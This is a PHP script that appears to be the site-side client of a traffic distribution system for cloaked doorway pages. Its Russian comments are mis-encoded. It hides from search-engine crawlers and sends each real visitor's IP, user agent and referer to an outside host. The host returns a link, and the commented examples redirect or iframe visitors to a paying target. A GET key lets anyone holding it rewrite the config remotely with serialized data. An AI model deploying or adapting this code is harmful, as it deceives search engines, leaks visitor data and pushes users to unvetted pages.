<?php
$z_api_key_host = 'LmRe4q';//API РєР»СЋС‡
$z_url = 'http://point.mailmamba.ru/?api=';//СЃСЃС‹Р»РєР° РЅР° TDS (Р·Р°РјРµРЅРёС‚Рµ С‚РѕР»СЊРєРѕ РґРѕРјРµРЅ)
$z_conf_file = 'api.ini';//РЅР°Р·РІР°РЅРёРµ С„Р°Р№Р»Р° СЃ РєРѕРЅС„РёРіРѕРј (РїРµСЂРµРёРјРµРЅСѓР№С‚Рµ!)
$z_conf_edit = 1;//Р·Р°РїСЂРµС‚РёС‚СЊ/СЂР°Р·СЂРµС€РёС‚СЊ СЂРµРґР°РєС‚РёСЂРѕРІР°РЅРёРµ РєРѕРЅС„РёРіР° РёР· Р°РґРјРёРЅРєРё TDS (0/1)
$z_allow_ip = '';//СЂР°Р·СЂРµС€РёС‚СЊ СЂРµРґР°РєС‚РёСЂРѕРІР°РЅРёРµ РєРѕРЅС„РёРіР° С‚РѕР»СЊРєРѕ СЃ СЌС‚РёС… IP (127.0.0.1,127.0.0.2)
$z_timeout = 10;//С‚Р°Р№РјР°СѓС‚ СЃРѕРµРґРёРЅРµРЅРёСЏ РІ СЃРµРєСѓРЅРґР°С… (С‚РѕР»СЊРєРѕ РґР»СЏ curl)
@date_default_timezone_set('Europe/Moscow');
@ini_set('display_errors', 0);
@error_reporting(0);
if(!file_exists($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file)){
	$z_conf = array();
	$z_conf['id'] = 'api';//ID РіСЂСѓРїРїС‹
	$z_conf['cf_ip'] = 0;//РѕРїСЂРµРґРµР»СЏС‚СЊ IP РїРѕСЃРµС‚РёС‚РµР»СЏ РїРѕ $_SERVER["HTTP_CF_CONNECTING_IP"] (0/1)
	$z_conf['em_referer'] = 0;//РµСЃР»Рё РїСѓСЃС‚РѕР№ СЂРµС„РµСЂРµСЂ - СЌС‚Рѕ Р±РѕС‚ (0/1)
	$z_conf['em_useragent'] = 1;//РµСЃР»Рё РїСѓСЃС‚РѕР№ СЋР·РµСЂР°РіРµРЅС‚ - СЌС‚Рѕ Р±РѕС‚ (0/1)
	$z_conf['em_lang'] = 0;//РµСЃР»Рё РїСѓСЃС‚РѕР№ СЏР·С‹Рє Р±СЂР°СѓР·РµСЂР° - СЌС‚Рѕ Р±РѕС‚ (0/1)
	$z_conf['ipv6'] = 1;//РµСЃР»Рё IP Р°РґСЂРµСЃ IPV6 - СЌС‚Рѕ Р±РѕС‚ (0/1)
	$z_conf['ptr'] = 0;//РїСЂРѕРІРµСЂСЏС‚СЊ PTR Р·Р°РїРёСЃСЊ (0/1)
	$z_conf['rd_bots'] = 0;//Р·Р°РїСЂР°С€РёРІР°С‚СЊ СЃ TDS РґР°РЅРЅС‹Рµ РґР»СЏ Р±РѕС‚РѕРІ (0/1)
	$z_conf['rd_se'] = 0;//Р·Р°РїСЂР°С€РёРІР°С‚СЊ СЃ TDS РґР°РЅРЅС‹Рµ С‚РѕР»СЊРєРѕ РґР»СЏ РїРѕСЃРµС‚РёС‚РµР»РµР№ РёР· РџРЎ (0/1)
	$z_conf['rotator'] = 1;//РІРєР»СЋС‡РёС‚СЊ СЂРѕС‚Р°С‚РѕСЂ Рё СЂР°Р·СЂРµС€РёС‚СЊ СѓСЃС‚Р°РЅРѕРІРєСѓ cookies (0/1)
	$z_conf['n_cookies'] = 'md5(host)';//РЅР°Р·РІР°РЅРёРµ cookies РґР»СЏ РїРѕСЃРµС‚РёС‚РµР»РµР№
	$z_conf['t_cookies'] = 3600;//РІСЂРµРјСЏ Р¶РёР·РЅРё cookies РІ СЃРµРєСѓРЅРґР°С…
	$z_conf['m_cookies'] = 0;//СЃС‡РёС‚Р°С‚СЊ Expires РѕС‚ LastAccessed РёР»Рё РѕС‚ CreationTime (0/1)
	$z_conf['connect'] = 1;//С‚РёРї СЃРѕРµРґРёРЅРµРЅРёСЏ СЃ TDS, file_get_contents РёР»Рё curl (0/1)
	$z_conf['conf_lc'] = date("d.m.Y H:i:s");//РґР°С‚Р° Рё РІСЂРµРјСЏ РїРѕСЃР»РµРґРЅРµРіРѕ РёР·РјРµРЅРµРЅРёСЏ РєРѕРЅС„РёРіР°
	$z_conf['status'] = 1;//РІС‹РєР»СЋС‡РёС‚СЊ/РІРєР»СЋС‡РёС‚СЊ СЃР»РёРІ (0/1)
	$z_conf['ip_serv_seodor'] = '';//IP СЃРµСЂРІРµСЂРЅРѕР№ С‡Р°СЃС‚Рё SEoDOR
	$z_conf['sign_ref'] = htmlentities('iframe-toloka.com,hghltd.yandex.net', ENT_QUOTES, 'UTF-8');//РїСЂРёР·РЅР°РєРё Р±РѕС‚РѕРІ РІ СЂРµС„РµСЂРµСЂРµ
	$z_conf['sign_ua'] = htmlentities('ahrefs,aport,ask,bot,btwebclient,butterfly,commentreader,copier,crawler,crowsnest,curl,disco,ezooms,fairshare,httrack,ia_archiver,internetseer,java,js-kit,larbin,libwww,linguee,linkexchanger,lwp-trivial,netvampire,nigma,ning,nutch,offline,peerindex,postrank,rambler,semrush,slurp,soup,spider,sweb,teleport,twiceler,voyager,wget,wordpress,yeti,zeus', ENT_QUOTES, 'UTF-8');//РїСЂРёР·РЅР°РєРё Р±РѕС‚РѕРІ РІ СЋР·РµСЂР°РіРµРЅС‚Рµ
/*РќРёР¶Рµ РЅРёС‡РµРіРѕ РЅРµ РёР·РјРµРЅСЏР№С‚Рµ*/
	$z_conf_default = serialize($z_conf);
	file_put_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file, $z_conf_default, LOCK_EX);
	$z_conf = unserialize(file_get_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file));
}
else{
	$z_conf = unserialize(file_get_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file));
}
if($z_conf_edit == 1 && !empty($_GET['key']) && $_GET['key'] == $z_api_key_host && empty($_GET['conf'])){
	if(!z_ip_check($z_allow_ip)){
		header('HTTP/1.0 404 Not Found', true, 404);
		exit();
	}
	echo serialize($z_conf);
	exit();
}
if($z_conf_edit == 1 && !empty($_GET['key']) && $_GET['key'] == $z_api_key_host && !empty($_GET['conf'])){
	if(!z_ip_check($z_allow_ip)){
		header('HTTP/1.0 404 Not Found', true, 404);
		exit();
	}
	$z_conf = base64_decode($_GET['conf']);
	$z_conf_tmp = @unserialize($z_conf);
	if(is_array($z_conf_tmp)){
		file_put_contents($_SERVER['DOCUMENT_ROOT'].'/'.$z_conf_file, $z_conf, LOCK_EX);
	}
	exit();
}
$z_out = '';
$z_lang = '';
$z_country = '';
$z_city = '';
$z_region = '';
$z_device = '';
$z_operator = '';
$z_uniq = '';
$z_macros = '';
$z_empty = '-';
$z_bot = $z_empty;
if($z_conf['status'] == 1){
	$z_useragent = $z_empty;
	if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$z_useragent = $_SERVER['HTTP_USER_AGENT'];
	}
	elseif($z_conf['em_useragent'] == 1){
		$z_bot = 'empty_ua';
	}
	$z_referer = $z_empty;
	$z_se = $z_empty;
	if(!empty($_SERVER['HTTP_REFERER'])){
		$z_referer = $_SERVER['HTTP_REFERER'];
		if(stristr($z_referer, 'google')){$z_se = 'google';}
		if(stristr($z_referer, 'yandex')){$z_se = 'yandex';}
		if(stristr($z_referer, 'mail.ru')){$z_se = 'mail';}
		if(stristr($z_referer, 'yahoo')){$z_se = 'yahoo';}
		if(stristr($z_referer, 'bing')){$z_se = 'bing';}
	}
	elseif($z_bot == $z_empty && $z_conf['em_referer'] == 1){
		$z_bot = 'empty_ref';
	}
	if($z_bot == $z_empty && $z_referer != $z_empty && !empty($z_conf['sign_ref'])){
		$z_ex = explode(",", $z_conf['sign_ref']);
		foreach($z_ex as $z_value){
			$z_value = trim(html_entity_decode($z_value, ENT_QUOTES, 'UTF-8'));
			if(stristr($z_referer, $z_value)){
				$z_bot = 'sign_ref';
				break;
			}
		}
	}
	if(stristr($z_useragent, 'baidu')){$z_bot = 'baidu';}
	if(stristr($z_useragent, 'bing') || stristr($z_useragent, 'msnbot')){$z_bot = 'bing';}
	if(stristr($z_useragent, 'google')){$z_bot = 'google';}
	if(stristr($z_useragent, 'mail.ru')){$z_bot = 'mail';}
	if(stristr($z_useragent, 'yahoo')){$z_bot = 'yahoo';}
	if(stristr($z_useragent, 'yandex.com/bots')){$z_bot = 'yandex';}
	if($z_bot == $z_empty && $z_useragent != $z_empty && !empty($z_conf['sign_ua'])){
		$z_ex = explode(",", $z_conf['sign_ua']);
		foreach($z_ex as $z_value){
			$z_value = trim(html_entity_decode($z_value, ENT_QUOTES, 'UTF-8'));
			if(stristr($z_useragent, $z_value)){
				$z_bot = 'sign_ua';
				break;
			}
		}
	}
	$z_cf_country = $z_empty;
	if(!empty($_SERVER["HTTP_CF_IPCOUNTRY"])){
		$z_cf_country = strtolower($_SERVER["HTTP_CF_IPCOUNTRY"]);
	}
	if($z_conf['cf_ip'] == 1 && !empty($_SERVER["HTTP_CF_CONNECTING_IP"])){
		$z_ipuser = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	if($z_conf['cf_ip'] == 0 || empty($z_ipuser)){
		if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ".") > 0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ",") > 0){
				$z_ip = explode(",", $_SERVER['HTTP_X_FORWARDED_FOR']);
				$z_ipuser = trim($z_ip[0]);
			}
			elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ".") > 0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ",") === false){
				if(empty($z_conf['ip_serv_seodor'])){
					$z_ipuser = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
				}
			}
		}
		if(empty($z_ipuser)){
			$z_ipuser = trim($_SERVER['REMOTE_ADDR']);
		}
	}
	if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_ipuser = $z_empty;
	}
	if($z_bot == $z_empty && $z_conf['ipv6'] == 1 && filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_bot = 'ipv6';
	}
	if($z_bot == $z_empty && $z_conf['ptr'] == 1){
		$z_ptr_rec = gethostbyaddr($z_ipuser);
		if(stristr($z_ptr_rec, 'baidu')){$z_bot = 'baidu';}
		if(stristr($z_ptr_rec, 'bing') || stristr($z_ptr_rec, 'msnbot')){$z_bot = 'bing';}
		if(stristr($z_ptr_rec, 'google')){$z_bot = 'google';}
		if(stristr($z_ptr_rec, 'mail.ru')){$z_bot = 'mail';}
		if(stristr($z_ptr_rec, 'yahoo')){$z_bot = 'yahoo';}
		if(stristr($z_ptr_rec, 'yandex')){$z_bot = 'yandex';}
	}
	$z_lang = $z_empty;
	if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
		$z_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	}
	if(empty($z_lang) && $z_conf['em_lang'] == 1){
		$z_bot = 'empty_lang';
	}
	$z_domain = $_SERVER['HTTP_HOST'];
	$z_page_url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	if(($z_bot == $z_empty || $z_conf['rd_bots'] == 1) && $z_ipuser != $z_empty){
		$z_uniq = 'yes';
		if($z_conf['rotator'] == 1){
			if($z_conf['n_cookies'] == 'md5(host)'){
				$z_n_cookies = md5($z_domain);
			}
			else{
				$z_n_cookies = $z_conf['n_cookies'];
			}
			$z_t_cookies = time() + $z_conf['t_cookies'];
			$z_n_cookies_exp = md5($z_domain.'_exp');
			if(!isset($_COOKIE[$z_n_cookies])){
				SetCookie($z_n_cookies, 0, $z_t_cookies, '/');
				$z_counter = 0;
				$z_uniq = 'yes';
				if($z_conf['m_cookies'] == 1){
					SetCookie($z_n_cookies_exp, $z_t_cookies, $z_t_cookies, '/');
				}
			}
			else{
				$z_counter = $_COOKIE[$z_n_cookies] + 1;
				if($z_conf['m_cookies'] == 0){
					SetCookie($z_n_cookies, $z_counter, $z_t_cookies, '/');
				}
				if($z_conf['m_cookies'] == 1){
					if(isset($_COOKIE[$z_n_cookies_exp])){
						$z_t_cookies = $_COOKIE[$z_n_cookies_exp];
					}
					SetCookie($z_n_cookies, $z_counter, $z_t_cookies, '/');
				}
				$z_uniq = 'no';
			}
		}
		if(empty($z_key)){$z_key = '';}
		if(empty($z_parameter_1)){$z_parameter_1 = '';}
		if(empty($z_parameter_2)){$z_parameter_2 = '';}
		if(empty($z_parameter_3)){$z_parameter_3 = '';}
		if(empty($z_parameter_4)){$z_parameter_4 = '';}
		if(empty($z_parameter_5)){$z_parameter_5 = '';}
		$z_request = array();
		$z_request[0] = $z_api_key_host;
		$z_request[1] = $z_conf['id'];
		$z_request[2] = $z_ipuser;
		$z_request[3] = $z_referer;
		$z_request[4] = $z_useragent;
		$z_request[5] = $z_se;
		$z_request[6] = $z_domain;
		$z_request[7] = $z_lang;
		$z_request[8] = $z_uniq;
		$z_request[9] = urlencode($z_key);
		$z_request[10] = $z_cf_country;
		$z_request[11] = urlencode($z_parameter_1);
		$z_request[12] = urlencode($z_parameter_2);
		$z_request[13] = urlencode($z_parameter_3);
		$z_request[14] = urlencode($z_parameter_4);
		$z_request[15] = urlencode($z_parameter_5);
		$z_request = $z_url.base64_encode(serialize($z_request));
		if((empty($z_conf['ip_serv_seodor']) || $z_ipuser != $z_conf['ip_serv_seodor']) && ($z_conf['rd_se'] == 0 || ($z_conf['rd_se'] == 1 && $z_se != $z_empty))){
			if($z_conf['connect'] == 0){
				$z_response = @file_get_contents($z_request);
			}
			else{
				$z_ch = curl_init();
				curl_setopt($z_ch, CURLOPT_TIMEOUT, $z_timeout);
				curl_setopt($z_ch, CURLOPT_URL, $z_request);
				curl_setopt($z_ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($z_ch, CURLOPT_FOLLOWLOCATION, 1);
				$z_response = curl_exec($z_ch);
				curl_close($z_ch);
			}
			$z_response = @unserialize($z_response);
			if(is_array($z_response)){
				$z_out = trim(html_entity_decode($z_response[0], ENT_QUOTES, 'UTF-8'));
				$z_redirect = $z_response[1];
				if($z_redirect == 0){
					$z_country = $z_response[2];
					$z_region = $z_response[3];
					$z_city = $z_response[4];
					$z_device = $z_response[5];
					$z_operator = $z_response[6];
					$z_bot = $z_response[7];
					$z_uniq = $z_response[8];
					$z_lang = $z_response[9];
					$z_macros = trim(html_entity_decode($z_response[10], ENT_QUOTES, 'UTF-8'));
				}
				if(stristr($z_out, '|||') && $z_conf['rotator'] == 1){
					$z_out_ex = explode('|||', $z_out);
					if(isset($z_out_ex[$z_counter])){
						$z_test = trim($z_out_ex[$z_counter]);
					}
					if(!empty($z_test)){
						$z_out = trim($z_out_ex[$z_counter]);
					}
					else{
						$z_out = trim($z_out_ex[0]);
						SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
						$z_counter = 0;
					}
				}
				else{
					if(stristr($z_out, '|||')){
						$z_out_ex = explode('|||', $z_out);
						$z_out = trim($z_out_ex[0]);
					}
				}
				if(stristr($z_out, '[RAWURLENCODE_REFERER]')){
					$z_out = str_ireplace('[RAWURLENCODE_REFERER]', rawurlencode($z_referer), $z_out);
				}
				if(stristr($z_out, '[URLENCODE_REFERER]')){
					$z_out = str_ireplace('[URLENCODE_REFERER]', urlencode($z_referer), $z_out);
				}
				if(stristr($z_out, '[RAWURLENCODE_PAGE_URL]')){
					$z_out = str_ireplace('[RAWURLENCODE_PAGE_URL]', rawurlencode($z_page_url), $z_out);
				}
				if(stristr($z_out, '[URLENCODE_PAGE_URL]')){
					$z_out = str_ireplace('[URLENCODE_PAGE_URL]', urlencode($z_page_url), $z_out);
				}
				/* Р—РґРµСЃСЊ РјРѕР¶РЅРѕ РїСЂРѕРїРёСЃР°С‚СЊ РЅСѓР¶РЅС‹Р№ РІР°Рј РєРѕРґ (СЃРј. РЅРёР¶Рµ) */
			}
		}
	}
}
function z_ip_check($z_allow_ip){
	if(!empty($z_allow_ip)){
		$z_ip = trim($_SERVER['REMOTE_ADDR']);
		if(stristr($z_allow_ip, ',')){
			$z_ex = explode(",", $z_allow_ip);
			foreach($z_ex as $z_value){
				if(trim($z_value) == $z_ip){
					return true;
				}
			}
		}
		elseif($z_ip == trim($z_allow_ip)){
			return true;
		}
	}
	else{
		return true;
	}
}
/*
Р•СЃР»Рё СЂРѕС‚Р°С‚РѕСЂ РІС‹РєР»СЋС‡РµРЅ, Р°СѓС‚РѕРј Р±СѓРґРµС‚ РїРµСЂРІС‹Р№ URL, СѓРЅРёРєР°Р»СЊРЅРѕСЃС‚СЊ "РїРѕ cookies" СЂР°Р±РѕС‚Р°С‚СЊ РЅРµ Р±СѓРґРµС‚
РџРµСЂРµРјРµРЅРЅС‹Рµ  | РІРѕР·РјРѕР¶РЅС‹Рµ РґР°РЅРЅС‹Рµ
------------------------------
$z_out      | СЃСЃС‹Р»РєР° РЅР° РїР»Р°С‚РЅРёРє/РєРѕРґ РёР»Рё РїСѓСЃС‚Рѕ
$z_lang     | СЏР·С‹Рє Р±СЂР°СѓР·РµСЂР° РёР»Рё $z_empty
$z_country  | РєРѕРґ СЃС‚СЂР°РЅС‹ РёР»Рё $z_empty
$z_city     | РіРѕСЂРѕРґ РёР»Рё $z_empty
$z_region   | РєРѕРґ СЂРµРіРёРѕРЅР° РёР»Рё $z_empty
$z_device   | computer, tablet, phone
$z_operator | beeline, megafon, mts, tele2, azerbaijan, belarus, kazakhstan, ukraine, wap-1, wap-2, wap-3 РёР»Рё $z_empty
$z_bot      | baidu, bing, google ,mail, yahoo, yandex ... РёР»Рё $z_empty
$z_uniq     | yes, no
$z_macros   | СЂРµР·СѓР»СЊС‚Р°С‚ РѕР±СЂР°Р±РѕС‚РєРё РјР°РєСЂРѕСЃРѕРІ РёР»Рё РїСѓСЃС‚Рѕ
*/
/*
Р’ РЅРµРєРѕС‚РѕСЂС‹С… СЃР»СѓС‡Р°СЏС… РјРѕР¶РЅРѕ РїСЂРѕРїРёСЃС‹РІР°С‚СЊ РєРѕРґ СЂРµРґРёСЂРµРєС‚Р° РёР»Рё С„СЂРµР№РјР° РІРЅСѓС‚СЂРё api.php
РџСЂРёРјРµСЂС‹ РєРѕРґР°:
1. Р РµРґРёСЂРµРєС‚ WAP С‚СЂР°С„РёРєР°
if($z_operator != $z_empty && $z_bot == $z_empty && !empty($z_out)){header("Location: $z_out");}
2. РЎРіРµРЅРµСЂРёСЂРѕРІР°С‚СЊ Рё РїРѕРєР°Р·Р°С‚СЊ СЃС‚СЂР°РЅРёС†Сѓ СЃ С„СЂРµР№РјРѕРј, РґР»СЏ РІСЃРµС… РєСЂРѕРјРµ Р±РѕС‚РѕРІ
if($z_bot == $z_empty && !empty($z_out)){echo '<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_out.'"></frameset></html>';exit();}
3. РЈРїСЂР°РІР»РµРЅРёРµ С‚РёРїРѕРј СЃР»РёРІР° РёР· Р°РґРјРёРЅРєРё TDS
if($z_bot == $z_empty && !empty($z_out) && stristr($z_out, ';')){
	$z_ex = explode(";", $z_out);
	$z_type = trim($z_ex[0]);
	$z_link = trim($z_ex[1]);
	if($z_type == 'redirect'){header("Location: $z_link");exit();}
	if($z_type == 'iframe'){echo '<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_link.'"></frameset></html>';exit();}
}
Р”Р»СЏ СЂРµРґРёСЂРµРєС‚Р° РїСЂРѕРїРёС€РёС‚Рµ РІ Р°СѓС‚Рµ: redirect;http://platnik.ru
Р”Р»СЏ С„СЂРµР№РјР°: iframe;http://platnik.ru
*/
?>
